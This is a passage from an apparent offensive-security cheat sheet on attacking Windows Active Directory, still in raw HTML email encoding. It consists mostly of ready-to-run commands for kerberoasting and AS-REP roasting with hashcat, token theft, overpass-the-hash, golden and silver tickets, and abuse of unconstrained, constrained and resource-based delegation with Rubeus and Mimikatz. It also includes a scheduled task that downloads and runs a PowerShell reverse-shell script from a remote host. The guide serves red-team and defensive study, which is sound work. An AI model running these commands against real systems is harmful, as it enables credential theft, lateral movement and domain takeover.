</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>Crack the hash with Hashcat:</p><div=
 class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=
=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;ta=
b-size:4" class=3D" language-bash"><code class=3D" language-bash" data-lang=
=3D"bash">hashcat -a <span class=3D"token number">0</span> -m <span class=
=3D"token number">13100</span> hash.txt <span class=3D"token variable"><spa=
n class=3D"token variable">`</span><span class=3D"token builtin class-name"=
>pwd</span><span class=3D"token variable">`</span></span>/rockyou.txt --rul=
es-file <span class=3D"token variable"><span class=3D"token variable">`</sp=
an><span class=3D"token builtin class-name">pwd</span><span class=3D"token =
variable">`</span></span>/hashcat/rules/best64.rule
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Bash<=
/span></div></div></div></div><h4 id=3D"manual">Manual</h4><div class=3D"hi=
ghlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0=
d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" cla=
ss=3D" language-powershell"><code class=3D" language-powershell" data-lang=
=3D"powershell"><span class=3D"token comment"># Request TGS for kerberoasta=
ble account (SPN)</span>
<span class=3D"token function">Add-Type</span> <span class=3D"token operato=
r">-</span>AssemblyName System<span class=3D"token punctuation">.</span>Ide=
ntityModel
<span class=3D"token function">New-Object</span> System<span class=3D"token=
 punctuation">.</span>IdentityModel<span class=3D"token punctuation">.</spa=
n>Tokens<span class=3D"token punctuation">.</span>KerberosRequestorSecurity=
Token <span class=3D"token operator">-</span>ArgumentList <span class=3D"to=
ken string">"MSSQLSvc/sqlserver.targetdomain.com"</span>

<span class=3D"token comment"># Dump TGS to disk</span>
<span class=3D"token function">Invoke-Mimikatz</span> <span class=3D"token =
operator">-</span>Command <span class=3D"token string">'"kerberos::list /ex=
port"'</span>

<span class=3D"token comment"># Crack with TGSRepCrack</span>
python<span class=3D"token punctuation">.</span>exe <span class=3D"token pu=
nctuation">.</span>\tgsrepcrack<span class=3D"token punctuation">.</span>py=
 <span class=3D"token punctuation">.</span>\10k<span class=3D"token operato=
r">-</span>worst<span class=3D"token operator">-</span>pass<span class=3D"t=
oken punctuation">.</span>txt <span class=3D"token punctuation">.</span>\ms=
sqlsvc<span class=3D"token punctuation">.</span>kirbi
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h4 id=3D"targeted-kerberoasting-by-set=
ting-spn">Targeted kerberoasting by setting SPN</h4><p>We need have ACL wri=
te permissions to set UserAccountControl flags for the target user, see abo=
ve for identification of interesting ACLs. Using PowerView:</p><div class=
=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"col=
or:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:=
4" class=3D" language-powershell"><code class=3D" language-powershell" data=
-lang=3D"powershell"><span class=3D"token function">Set-DomainObject</span>=
 <span class=3D"token operator">-</span>Identity TargetUser <span class=3D"=
token operator">-</span><span class=3D"token function">Set</span> @<span cl=
ass=3D"token punctuation">{</span>serviceprincipalname=3D<span class=3D"tok=
en string">'any/thing'</span><span class=3D"token punctuation">}</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h3 id=3D"as-rep-roasting">AS-REP roast=
ing</h3><p>Get the hash for a roastable user (see above for hunting). Using=
 <code>ASREPRoast.ps1</code>:</p><div class=3D"highlight"><div class=3D"cod=
e-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-color:#202=
020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-powershell=
"><code class=3D" language-powershell" data-lang=3D"powershell"><span class=
=3D"token function">Get-ASREPHash</span> <span class=3D"token operator">-</=
span>UserName TargetUser
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>Crack the hash with Hashcat:</p><div=
 class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=
=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;ta=
b-size:4" class=3D" language-bash"><code class=3D" language-bash" data-lang=
=3D"bash">hashcat -a <span class=3D"token number">0</span> -m <span class=
=3D"token number">18200</span> hash.txt <span class=3D"token variable"><spa=
n class=3D"token variable">`</span><span class=3D"token builtin class-name"=
>pwd</span><span class=3D"token variable">`</span></span>/rockyou.txt --rul=
es-file <span class=3D"token variable"><span class=3D"token variable">`</sp=
an><span class=3D"token builtin class-name">pwd</span><span class=3D"token =
variable">`</span></span>/hashcat/rules/best64.rule
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Bash<=
/span></div></div></div></div><h4 id=3D"targeted-as-rep-roasting-by-disabli=
ng-kerberos-pre-authentication">Targeted AS-REP roasting by disabling Kerbe=
ros pre-authentication</h4><p>Again, we need ACL write permissions to set U=
serAccountControl flags for the target user. Using PowerView:</p><div class=
=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"col=
or:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:=
4" class=3D" language-powershell"><code class=3D" language-powershell" data=
-lang=3D"powershell"><span class=3D"token function">Set-DomainObject</span>=
 <span class=3D"token operator">-</span>Identity TargetUser <span class=3D"=
token operator">-XOR</span> @<span class=3D"token punctuation">{</span>user=
accountcontrol=3D4194304<span class=3D"token punctuation">}</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h3 id=3D"token-manipulation">Token Man=
ipulation</h3><p>Tokens can be impersonated from other users with a session=
/running processes on the machine. Most C2 frameworks have functionality fo=
r this built-in (such as the =E2=80=98Steal Token=E2=80=99 functionality in=
 Cobalt Strike).</p><h4 id=3D"incognito">Incognito</h4><div class=3D"highli=
ght"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0=
;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=
=3D" language-powershell"><code class=3D" language-powershell" data-lang=3D=
"powershell"><span class=3D"token comment"># Show tokens on the machine</sp=
an>
<span class=3D"token punctuation">.</span>\incognito<span class=3D"token pu=
nctuation">.</span>exe list_tokens <span class=3D"token operator">-</span>u

<span class=3D"token comment"># Start new process with token of a specific =
user</span>
<span class=3D"token punctuation">.</span>\incognito<span class=3D"token pu=
nctuation">.</span>exe execute <span class=3D"token operator">-</span>c <sp=
an class=3D"token string">"domain\user"</span> C:\Windows\system32\calc<spa=
n class=3D"token punctuation">.</span>exe
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><blockquote><p>If you=E2=80=99re using =
Meterpreter, you can use the built-in Incognito module with <code>use incog=
nito</code>, the same commands are available.</p></blockquote><h4 id=3D"inv=
oke-tokenmanipulation">Invoke-TokenManipulation</h4><div class=3D"highlight=
"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;ba=
ckground-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" =
language-powershell"><code class=3D" language-powershell" data-lang=3D"powe=
rshell"><span class=3D"token comment"># Show all tokens on the machine</spa=
n>
<span class=3D"token function">Invoke-TokenManipulation</span> <span class=
=3D"token operator">-</span>ShowAll

<span class=3D"token comment"># Show only unique, usable tokens on the mach=
ine</span>
<span class=3D"token function">Invoke-TokenManipulation</span> <span class=
=3D"token operator">-</span>Enumerate

<span class=3D"token comment"># Start new process with token of a specific =
user</span>
<span class=3D"token function">Invoke-TokenManipulation</span> <span class=
=3D"token operator">-</span>ImpersonateUser <span class=3D"token operator">=
-</span>Username <span class=3D"token string">"domain\user"</span>

<span class=3D"token comment"># Start new process with token of another pro=
cess</span>
<span class=3D"token function">Invoke-TokenManipulation</span> <span class=
=3D"token operator">-</span>CreateProcess <span class=3D"token string">"C:\=
Windows\system32\calc.exe"</span> <span class=3D"token operator">-</span>Pr=
ocessId 500
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h3 id=3D"lateral-movement-with-rubeus"=
>Lateral Movement with Rubeus</h3><p>We can use Rubeus to execute a techniq=
ue called =E2=80=9COverpass-the-Hash=E2=80=9D. In this technique, instead o=
f passing the hash directly (another technique known as Pass-the-Hash), we =
use the NTLM hash of an account to request a valid Kerberost ticket (TGT). =
We can then use this ticket to authenticate towards the domain as the targe=
t user.</p><div class=3D"highlight"><div class=3D"code-toolbar"><pre tabind=
ex=3D"0" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o=
-tab-size:4;tab-size:4" class=3D" language-powershell"><code class=3D" lang=
uage-powershell" data-lang=3D"powershell"><span class=3D"token comment"># R=
equest a TGT as the target user and pass it into the current session</span>
<span class=3D"token comment"># NOTE: Make sure to clear tickets in the cur=
rent session (with 'klist purge') to ensure you don't have multiple active =
TGTs</span>
<span class=3D"token punctuation">.</span>\Rubeus<span class=3D"token punct=
uation">.</span>exe asktgt <span class=3D"token operator">/</span>user:Admi=
nistrator <span class=3D"token operator">/</span>rc4:<span class=3D"token n=
amespace">[NTLMHASH]</span> <span class=3D"token operator">/</span>ptt

<span class=3D"token comment"># More stealthy variant, but requires the AES=
256 key (see 'Dumping OS credentials with Mimikatz' section)</span>
<span class=3D"token punctuation">.</span>\Rubeus<span class=3D"token punct=
uation">.</span>exe asktgt <span class=3D"token operator">/</span>user:Admi=
nistrator <span class=3D"token operator">/</span>aes256:<span class=3D"toke=
n namespace">[AES256KEY]</span> <span class=3D"token operator">/</span>opse=
c <span class=3D"token operator">/</span>ptt

<span class=3D"token comment"># Pass the ticket to a sacrificial hidden pro=
cess, allowing you to e.g. steal the token from this process (requires elev=
ation)</span>
<span class=3D"token punctuation">.</span>\Rubeus<span class=3D"token punct=
uation">.</span>exe asktgt <span class=3D"token operator">/</span>user:Admi=
nistrator <span class=3D"token operator">/</span>rc4:<span class=3D"token n=
amespace">[NTLMHASH]</span> <span class=3D"token operator">/</span>createne=
tonly:C:\Windows\System32\cmd<span class=3D"token punctuation">.</span>exe
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>Once we have a TGT as the target use=
r, we can use services as this user in a domain context, allowing us to mov=
e laterally.</p><h3 id=3D"lateral-movement-with-mimikatz">Lateral Movement =
with Mimikatz</h3><p>Note that Mimikatz is incredibly versatile and is disc=
ussed in multiple sections throughout this blog. Because of this, however, =
the binary is also very well-detected. If you need to run Mimikatz on your =
target (not recommended), executing a custom version reflectively is your b=
est bet. There are also options such as <a href=3D"https://github.com/Power=
ShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1">Invoke=
-MimiKatz</a> or <a href=3D"https://github.com/GhostPack/SafetyKatz">Safety=
katz</a>. Note that the latter is more stealthy but does not include all fu=
nctionality.</p><div class=3D"highlight"><div class=3D"code-toolbar"><pre t=
abindex=3D"0" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size=
:4;-o-tab-size:4;tab-size:4" class=3D" language-plaintext"><code class=3D" =
language-plaintext" data-lang=3D"plaintext"># Overpass-the-hash (more risky=
 than Rubeus, writes to LSASS memory)
sekurlsa::pth /user:Administrator /domain:targetdomain.com /ntlm:[NTLMHASH]=
 /run:powershell.exe

# Or, a more opsec-safe version that uses the AES256 key (similar to with R=
ubeus above) - works for multiple Mimikatz commands
sekurlsa::pth /user:Administrator /domain:targetdomain.com /aes256:[AES256K=
EY] /run:powershell.exe

# Golden ticket (domain admin, w/ some ticket properties to avoid detection=
)
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21=
-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /star=
toffset:0 /endin:600 /renewmax:10080 /ptt

# Silver ticket for a specific SPN with a compromised service / machine acc=
ount
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21=
-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.targetdomain.com /service=
:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewm=
ax:10080 /ptt
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Plain=
text</span></div></div></div></div><blockquote><p>A nice overview of the SP=
Ns relevant for offensive purposes is provided <a href=3D"https://adsecurit=
y.org/?p=3D2011">here</a> (scroll down) and <a href=3D"https://github.com/s=
wisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/A=
ctive%20Directory%20Attack.md#pass-the-ticket-silver-tickets">here</a>.</p>=
</blockquote><h3 id=3D"command-execution-with-scheduled-tasks">Command exec=
ution with scheduled tasks</h3><p><em>Requires =E2=80=98Host=E2=80=99 SPN</=
em></p><p>To create a task:</p><div class=3D"highlight"><div class=3D"code-=
toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-color:#20202=
0;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-powershell">=
<code class=3D" language-powershell" data-lang=3D"powershell"><span class=
=3D"token comment"># Mind the quotes. Use encoded commands if quoting becom=
es too much of a pain</span>
schtasks <span class=3D"token operator">/</span>create <span class=3D"token=
 operator">/</span>tn <span class=3D"token string">"shell"</span> <span cla=
ss=3D"token operator">/</span>ru <span class=3D"token string">"NT Authority=
\SYSTEM"</span> <span class=3D"token operator">/</span>s dc<span class=3D"t=
oken punctuation">.</span>targetdomain<span class=3D"token punctuation">.</=
span>com <span class=3D"token operator">/</span><span class=3D"token functi=
on">sc</span> weekly <span class=3D"token operator">/</span>tr <span class=
=3D"token string">"Powershell.exe -c 'IEX (New-Object Net.WebClient).Downlo=
adString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'"</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>To trigger the task:</p><div class=
=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"col=
or:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:=
4" class=3D" language-powershell"><code class=3D" language-powershell" data=
-lang=3D"powershell">schtasks <span class=3D"token operator">/</span>RUN <s=
pan class=3D"token operator">/</span>TN <span class=3D"token string">"shell=
"</span> <span class=3D"token operator">/</span>s dc<span class=3D"token pu=
nctuation">.</span>targetdomain<span class=3D"token punctuation">.</span>co=
m
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h3 id=3D"command-execution-with-wmi">C=
ommand execution with WMI</h3><p><em>Requires =E2=80=98Host=E2=80=99 and =
=E2=80=98RPCSS=E2=80=99 SPNs</em></p><h4 id=3D"from-windows">From Windows</=
h4><div class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0"=
 style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-siz=
e:4;tab-size:4" class=3D" language-powershell"><code class=3D" language-pow=
ershell" data-lang=3D"powershell"><span class=3D"token function">Invoke-Wmi=
Method</span> win32_process <span class=3D"token operator">-</span>Computer=
Name dc<span class=3D"token punctuation">.</span>targetdomain<span class=3D=
"token punctuation">.</span>com <span class=3D"token operator">-</span>name=
 create <span class=3D"token operator">-</span>argumentlist <span class=3D"=
token string">"powershell.exe -e <span class=3D"token variable">$encodedCom=
mand</span>"</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h4 id=3D"from-linux">From Linux</h4><d=
iv class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" styl=
e=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;t=
ab-size:4" class=3D" language-bash"><code class=3D" language-bash" data-lan=
g=3D"bash"><span class=3D"token comment"># with password</span>
impacket-wmiexec DOMAIN/targetuser:password@172.16.4.101

<span class=3D"token comment"># with hash</span>
impacket-wmiexec DOMAIN/targetuser@172.16.4.101 -hashes :e0e223d63905f5a779=
6fb1006e7dc594

<span class=3D"token comment"># with Kerberos authentication (make sure you=
r client is setup to use the right ticket, and that you have a TGS with the=
 right SPNs)</span>
impacket-wmiexec DOMAIN/targetuser@172.16.4.101 -no-pass -k
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Bash<=
/span></div></div></div></div><h3 id=3D"command-execution-with-powershell-r=
emoting">Command execution with PowerShell Remoting</h3><p><em>Requires =E2=
=80=98CIFS=E2=80=99 and =E2=80=98HTTP=E2=80=99 SPNs. May also need the =E2=
=80=98WSMAN=E2=80=99 or =E2=80=98RPCSS=E2=80=99 SPNs (depending on OS versi=
on)</em></p><div class=3D"highlight"><div class=3D"code-toolbar"><pre tabin=
dex=3D"0" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-=
o-tab-size:4;tab-size:4" class=3D" language-powershell"><code class=3D" lan=
guage-powershell" data-lang=3D"powershell"><span class=3D"token comment"># =
Create credential to run as another user (not needed after e.g. Overpass-th=
e-Hash)</span>
<span class=3D"token comment"># Leave out -Credential $Cred in the below co=
mmands to run as the current user instead</span>
<span class=3D"token variable">$SecPassword</span> =3D <span class=3D"token=
 function">ConvertTo-SecureString</span> <span class=3D"token string">'Vict=
imUserPassword'</span> <span class=3D"token operator">-</span>AsPlainText <=
span class=3D"token operator">-</span>Force
<span class=3D"token variable">$Cred</span> =3D <span class=3D"token functi=
on">New-Object</span> System<span class=3D"token punctuation">.</span>Manag=
ement<span class=3D"token punctuation">.</span>Automation<span class=3D"tok=
en punctuation">.</span>PSCredential<span class=3D"token punctuation">(</sp=
an><span class=3D"token string">'DOMAIN\targetuser'</span><span class=3D"to=
ken punctuation">,</span> <span class=3D"token variable">$SecPassword</span=
><span class=3D"token punctuation">)</span>

<span class=3D"token comment"># Run a command remotely (can be used on mult=
iple machines at once)</span>
<span class=3D"token function">Invoke-Command</span> <span class=3D"token o=
perator">-</span>Credential <span class=3D"token variable">$Cred</span> <sp=
an class=3D"token operator">-</span>ComputerName dc<span class=3D"token pun=
ctuation">.</span>targetdomain<span class=3D"token punctuation">.</span>com=
 <span class=3D"token operator">-</span>ScriptBlock <span class=3D"token pu=
nctuation">{</span>whoami<span class=3D"token punctuation">;</span> hostnam=
e<span class=3D"token punctuation">}</span>

<span class=3D"token comment"># Launch a session as another user (prompt fo=
r password instead, for use with e.g. RDP)</span>
<span class=3D"token function">Enter-PsSession</span> <span class=3D"token =
operator">-</span>ComputerName dc<span class=3D"token punctuation">.</span>=
targetdomain<span class=3D"token punctuation">.</span>com <span class=3D"to=
ken operator">-</span>Credential DOMAIN<span class=3D"token operator">/</sp=
an>targetuser

<span class=3D"token comment"># Create a persistent session (will remember =
variables etc.), load a script into said session, and enter a remote sessio=
n prompt</span>
<span class=3D"token variable">$sess</span> =3D <span class=3D"token functi=
on">New-PsSession</span> <span class=3D"token operator">-</span>Credential =
<span class=3D"token variable">$Cred</span> <span class=3D"token operator">=
-</span>ComputerName dc<span class=3D"token punctuation">.</span>targetdoma=
in<span class=3D"token punctuation">.</span>com
<span class=3D"token function">Invoke-Command</span> <span class=3D"token o=
perator">-</span>Session <span class=3D"token variable">$sess</span> <span =
class=3D"token operator">-</span>FilePath c:\path\to\file<span class=3D"tok=
en punctuation">.</span>ps1
<span class=3D"token function">Enter-PsSession</span> <span class=3D"token =
operator">-</span>Session <span class=3D"token variable">$sess</span>

<span class=3D"token comment"># Copy files to or from an active PowerShell =
remoting session</span>
<span class=3D"token function">Copy-Item</span> <span class=3D"token operat=
or">-</span>Path <span class=3D"token punctuation">.</span>\<span class=3D"=
token function">Invoke-Mimikatz</span><span class=3D"token punctuation">.</=
span>ps1 <span class=3D"token operator">-</span>ToSession <span class=3D"to=
ken variable">$sess</span> <span class=3D"token operator">-</span>Destinati=
on <span class=3D"token string">"C:\Users\public\"</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h3 id=3D"unconstrained-delegation">Unc=
onstrained delegation</h3><p>Unconstrained Delegation can be set on a <em>f=
rontend service</em> (e.g., an IIS web server) to allow it to delegate on b=
ehalf of a user to <em>any service in the domain</em> (towards a <em>backen=
d service</em>, such as an MSSQL database).</p><p>DACL UAC property: <code>=
TrustedForDelegation</code>.</p><h4 id=3D"exploitation">Exploitation</h4><p=
>With administrative privileges on a server with Unconstrained Delegation s=
et, we can dump the TGTs for other users that have a connection. If we do t=
his successfully, we can impersonate the victim user towards any service in=
 the domain.</p><p>With Mimikatz:</p><div class=3D"highlight"><div class=3D=
"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-color:=
#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-plaint=
ext"><code class=3D" language-plaintext" data-lang=3D"plaintext">sekurlsa::=
tickets /export
kerberos::ptt c:\path\to\ticket.kirbi
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Plain=
text</span></div></div></div></div><p>Or with Rubeus:</p><div class=3D"high=
light"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0=
d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=
=3D" language-powershell"><code class=3D" language-powershell" data-lang=3D=
"powershell"><span class=3D"token punctuation">.</span>\Rubeus<span class=
=3D"token punctuation">.</span>exe triage
<span class=3D"token punctuation">.</span>\Rubeus<span class=3D"token punct=
uation">.</span>exe dump <span class=3D"token operator">/</span>luid:0x5379=
f2 <span class=3D"token operator">/</span>nowrap
<span class=3D"token punctuation">.</span>\Rubeus<span class=3D"token punct=
uation">.</span>exe ptt <span class=3D"token operator">/</span>ticket:doIFS=
DCC<span class=3D"token punctuation">[</span><span class=3D"token punctuati=
on">.</span><span class=3D"token punctuation">.</span><span class=3D"token =
punctuation">.</span><span class=3D"token punctuation">]</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>We can also gain the hash for a doma=
in controller machine account, if that DC is vulnerable to the printer bug.=
 If we do this successfully, we can DCSync the domain controller (see below=
) to completely compromise the current domain.</p><p>On the server with Unc=
onstrained Delegation, monitor for new tickets with Rubeus.</p><div class=
=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"col=
or:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:=
4" class=3D" language-powershell"><code class=3D" language-powershell" data=
-lang=3D"powershell"><span class=3D"token punctuation">.</span>\Rubeus<span=
 class=3D"token punctuation">.</span>exe monitor <span class=3D"token opera=
tor">/</span>interval:5 <span class=3D"token operator">/</span>nowrap
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>From attacking machine, entice the D=
omain Controller to connect using the printer bug. Binary from <a href=3D"h=
ttps://github.com/leechristensen/SpoolSample">here</a>.</p><div class=3D"hi=
ghlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0=
d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" cla=
ss=3D" language-powershell"><code class=3D" language-powershell" data-lang=
=3D"powershell"><span class=3D"token punctuation">.</span>\MS<span class=3D=
"token operator">-</span>RPRN<span class=3D"token punctuation">.</span>exe =
\\dc<span class=3D"token punctuation">.</span>targetdomain<span class=3D"to=
ken punctuation">.</span>com \\unconstrained<span class=3D"token operator">=
-</span>server<span class=3D"token punctuation">.</span>targetdomain<span c=
lass=3D"token punctuation">.</span>com
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>The TGT for the machine account of t=
he DC should come in in the first session. We can pass this ticket into our=
 current session to gain DCSync privileges (see below).</p><div class=3D"hi=
ghlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0=
d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" cla=
ss=3D" language-powershell"><code class=3D" language-powershell" data-lang=
=3D"powershell"><span class=3D"token punctuation">.</span>\Rubeus<span clas=
s=3D"token punctuation">.</span>exe ptt <span class=3D"token operator">/</s=
pan>ticket:doIFxTCCBc<span class=3D"token punctuation">.</span><span class=
=3D"token punctuation">.</span><span class=3D"token punctuation">.</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h3 id=3D"constrained-delegation">Const=
rained delegation</h3><p>Constrained delegation can be set on the <em>front=
end server</em> (e.g. IIS) to allow it to delegate to <em>only selected bac=
kend services</em> (e.g. MSSQL) on behalf of the user.</p><p>DACL UAC prope=
rty: <code>TrustedToAuthForDelegation</code>. This allows <code>s4u2self</c=
ode>, i.e. requesting a TGS on behalf of <em>anyone</em> to oneself, using =
just the NTLM password hash. This effectively allows the service to imperso=
nate other users in the domain with just their hash, and is useful in situa=
tions where Kerberos isn=E2=80=99t used between the user and frontend.</p><=
p>DACL Property: <code>msDS-AllowedToDelegateTo</code>. This property conta=
ins the SPNs it is allowed to use <code>s4u2proxy</code> on, i.e. requestin=
g a forwardable TGS for that server based on an existing TGS (often the one=
 gained from using <code>s4u2self</code>). This effectively defines the bac=
kend services that constrained delegation is allowed for.</p><p><strong>NOT=
E:</strong> These properties do NOT have to exist together! If <code>s4u2pr=
oxy</code> is allowed without <code>s4u2self</code>, user interaction is re=
quired to get a valid TGS to the frontend service from a user, similar to u=
nconstrained delegation.</p><h4 id=3D"exploitation-1">Exploitation</h4><p>I=
n this case, we use Rubeus to automatically request a TGT and then a TGS wi=
th the <code>ldap</code> SPN to allow us to DCSync using a machine account.=
</p><div class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0=
" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-si=
ze:4;tab-size:4" class=3D" language-powershell"><code class=3D" language-po=
wershell" data-lang=3D"powershell"><span class=3D"token comment"># Get a TG=
T using the compromised service account with delegation set (not needed if =
you already have an active session or token as this user)</span>
<span class=3D"token punctuation">.</span>\Rubeus<span class=3D"token punct=
uation">.</span>exe asktgt <span class=3D"token operator">/</span>user:svc_=
with_delegation <span class=3D"token operator">/</span>domain:targetdomain<=
span class=3D"token punctuation">.</span>com <span class=3D"token operator"=
>/</span>rc4:2892D26CDF84D7A70E2EB3B9F05C425E

<span class=3D"token comment"># Use s4u2self and s4u2proxy to impersonate t=
he DA user to the allowed SPN</span>
<span class=3D"token punctuation">.</span>\Rubeus<span class=3D"token punct=
uation">.</span>exe s4u <span class=3D"token operator">/</span>ticket:doIE<=
span class=3D"token operator">+</span>jCCBP<span class=3D"token punctuation=
">.</span><span class=3D"token punctuation">.</span><span class=3D"token pu=
nctuation">.</span> <span class=3D"token operator">/</span>impersonateuser:=
Administrator <span class=3D"token operator">/</span>msdsspn:time<span clas=
s=3D"token operator">/</span>dc <span class=3D"token operator">/</span>ptt

<span class=3D"token comment"># Same as the two above steps, but access the=
 LDAP service on the DC instead (for dcsync)</span>
<span class=3D"token punctuation">.</span>\Rubeus<span class=3D"token punct=
uation">.</span>exe s4u <span class=3D"token operator">/</span>user:sa_with=
_delegation <span class=3D"token operator">/</span>impersonateuser:Administ=
rator <span class=3D"token operator">/</span>msdsspn:time<span class=3D"tok=
en operator">/</span>dc <span class=3D"token operator">/</span>altservice:l=
dap <span class=3D"token operator">/</span>ptt <span class=3D"token operato=
r">/</span>rc4:2892D26CDF84D7A70E2EB3B9F05C425E
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h3 id=3D"resource-based-constrained-de=
legation">Resource-based constrained delegation</h3><p>Resource-Based Const=
rained Delegation (RBCD) configures the <em>backend server</em> (e.g. MSSQL=
) to allow <em>only selected frontend services</em> (e.g. IIS) to delegate =
on behalf of the user. This makes it easier for specific server administrat=
ors to configure delegation, without requiring domain admin privileges.</p>=
<p>DACL Property: <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>.</p=
><p>In this scenario, <code>s4u2self</code> and <code>s4u2proxy</code> are =
used as above to request a forwardable ticket on behalf of the user. Howeve=
r, with RBCD, the KDC checks if the SPN for the requesting service (i.e., t=
he <em>frontend service</em>) is present in the <code>msDS-AllowedToActOnBe=
halfOfOtherIdentity</code> property of the <em>backend service</em>. This m=
eans that the <em>frontend service</em> needs to have an SPN set. Thus, att=
acks against RBCD have to be performed from either a service account with S=
PN or a machine account.</p><h4 id=3D"exploitation-2">Exploitation</h4><p>I=
f we compromise a <em>frontend service</em> that appears in the RBCD proper=
ty of a <em>backend service</em>, exploitation is the same as with constrai=
ned delegation above. This is however not too common.</p><p>A more often-se=
en attack to RBCD is when we have <code>GenericWrite</code>, <code>GenericA=
ll</code>, <code>WriteProperty</code>, or <code>WriteDACL</code> permission=
s to a computer object in the domain. This means we can write the <code>msD=
S-AllowedToActOnBehalfOfOtherIdentity</code> property on this machine accou=
nt to add a controlled SPN or machine account to be trusted for delegation.=
 We can even create a new machine account and add it. This allows us to com=
promise the target machine in the context of any user, as with constrained =
delegation.</p><div class=3D"highlight"><div class=3D"code-toolbar"><pre ta=
bindex=3D"0" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:=
4;-o-tab-size:4;tab-size:4" class=3D" language-powershell"><code class=3D" =
language-powershell" data-lang=3D"powershell"><span class=3D"token comment"=
># Create a new machine account using PowerMad</span>
<span class=3D"token function">New-MachineAccount</span> <span class=3D"tok=
en operator">-</span>MachineAccount NewMachine <span class=3D"token operato=
r">-</span>Password $<span class=3D"token punctuation">(</span><span class=
